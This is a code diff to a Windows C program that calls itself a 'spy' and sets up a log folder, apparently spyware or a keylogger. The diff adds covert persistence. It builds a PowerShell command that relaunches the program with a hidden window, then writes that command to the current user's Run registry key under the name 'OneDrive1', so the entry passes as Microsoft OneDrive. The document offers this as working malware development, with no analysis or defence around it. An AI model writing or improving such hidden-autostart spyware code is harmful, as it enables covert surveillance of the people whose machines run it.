@@ -91,18 +91,23 @@ int main(int ac, char** av) {
 	fprintf(stderr, "[+] start spy\n");
 	// get current path of the program
 	char path[MAX_PATH];
+	char folder[MAX_PATH];
+	GetCurrentDirectoryA(MAX_PATH, folder);
 	GetModuleFileNameA(NULL, path, MAX_PATH);	
 	fprintf(stderr, "[+] path: %s\n", path);
 	// make program auto start when windows start
+	char command[1024];
+	sprintf_s(command, sizeof(command), "PowerShell -Command \"Start-Process '%s' -WindowStyle Hidden -WorkingDirectory '%s'\"", path, folder);
 	HKEY hKey = NULL;
-	LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
 	if (res == ERROR_SUCCESS) {
 		// create new registry key
-		RegSetValueEx(hKey, (LPCSTR)"OneDrive", 0, REG_SZ, (unsigned char*)path, strlen(path));
+		RegSetValueExA(hKey, (LPCSTR)"OneDrive1", 0, REG_SZ, (unsigned char*)command, strlen(command));
 		RegCloseKey(hKey);
+		printf("[+] program added to auto start\n");
 	}
 	else {
-		fprintf(stderr, "[-] RegOpenKeyEx failed\n");
+		fprintf(stderr, "[-] RegOpenKeyEx failed: %d", res);
 	}
 	// prepare log file
 	// create log folder inside current directory
